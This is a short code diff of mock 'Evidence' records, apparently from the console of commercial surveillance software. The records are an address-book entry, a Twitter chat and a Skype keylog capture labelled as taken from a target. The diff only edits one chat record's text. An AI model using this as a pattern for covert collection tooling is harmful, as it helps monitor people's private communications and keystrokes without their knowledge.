@@ -92,7 +92,7 @@ package it.ht.rcs.console.evidence.rest
       new Evidence({_id: 'e19', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,57,57)), dr: convertToUnix(new Date(2012,11,03,14,58,55)), _mid: 0, note: '', rel: 0, type: 'addressbook', data: new EvidenceData({name:'Jimmy Page',contact:'', info:'Facebook page: /pippo.pluto.73345048', program:'facebook', type:'target'})}),
       
       //chat ! ALERTED
-      new Evidence({_id: 'e24', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,58,07)), dr: convertToUnix(new Date(2012,11,03,14,59,00)), _mid: 0, note: '', rel: 0, type: 'chat', data: new EvidenceData({program: 'Twitter', topic:'Mon Dec 03 13:54:59 +0000 2012', peer:'Twitter', content:'Alberto Ornaghi: <span dir="rtl">بلى</span>', tr:'JimmyPage8000: Going to Nashville this weekend'})}),
+      new Evidence({_id: 'e24', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,14,58,07)), dr: convertToUnix(new Date(2012,11,03,14,59,00)), _mid: 0, note: '', rel: 0, type: 'chat', data: new EvidenceData({program: 'Twitter', topic:'Mon Dec 03 13:54:59 +0000 2012', peer:'Twitter', content:'JimmyPage8000: Going to Nashville this weekend', tr:'JimmyPage8000: Going to Nashville this weekend'})}),
       
       //keylog
       new Evidence({_id: 'e08', aid: 'a1', blo: false, da: convertToUnix(new Date(2012,11,03,15,01,42)), dr: convertToUnix(new Date(2012,11,03,15,01,46)), _mid: 0, note: '', rel: 0, type: 'keylog', data: new EvidenceData({program: 'Skype.exe', window: 'Skype™ - Add a contact', content:'alberto.ornaghi'})}),
